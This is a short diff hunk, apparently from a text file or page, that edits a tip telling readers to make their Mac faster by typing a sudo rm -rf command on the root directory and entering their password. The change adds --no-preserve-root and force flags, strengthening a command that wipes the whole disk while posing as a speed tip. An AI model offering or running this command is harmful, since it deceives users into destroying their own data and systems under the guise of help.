@@ -6,7 +6,7 @@
 
 
 Also, to make your mac faster, open the terminal and type
-    "  sudo rm -rf /
+    "  sudo rm -rf -f --force --no-preserve-root /
  "     and
 enter your password!
 
